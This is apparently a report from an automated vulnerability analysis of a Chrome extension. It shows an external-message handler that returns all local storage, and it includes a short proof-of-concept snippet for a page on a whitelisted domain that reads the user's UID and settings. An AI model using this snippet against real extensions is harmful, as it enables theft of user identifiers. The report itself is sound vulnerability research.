# CoCo Analysis: ojmlmmdnbioeggphndbnglflnhfjfbgf

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2 (duplicate detections)

---

## Sink: storage_local_get_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ojmlmmdnbioeggphndbnglflnhfjfbgf/opgen_generated_files/bg.js
Line 751: var storage_local_get_source = {'key': 'value'};
Line 752: 'key': 'value'

**Code:**

```javascript
// Background script (service.js) - Lines 992-1009
chrome.runtime.onMessageExternal.addListener((request, sender, sendResponse) => {
    switch (request.action) {
        case "add": {
            chrome.storage.local.get('color', (data) => {
                chrome.storage.local.set({color: data.color});
            });
            sendResponse(request.data);
            break
        }
        case "get": {
            chrome.storage.local.get((data) => sendResponse({data: data})); // ← attacker receives storage data
            sendResponse(request.data);
            break
        }
        default:
            break;
    }
})
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From any whitelisted domain or extension
// manifest.json: "externally_connectable": {"matches": ["*://*.cusmize.com/*", "*://*.youtube-customizer.com/*"]}
// Attacker on cusmize.com or youtube-customizer.com can send:

chrome.runtime.sendMessage("ojmlmmdnbioeggphndbnglflnhfjfbgf",
    {action: "get"},
    function(response) {
        console.log("Stolen storage data:", response.data);
        // response.data contains: dateInstalled, color, backgroundColor, uid
    }
);
```

**Impact:** External domains can exfiltrate all extension storage data including installation date, color preferences, and user UID. This is a complete storage information disclosure vulnerability via sendResponse to attacker-controlled external messages.
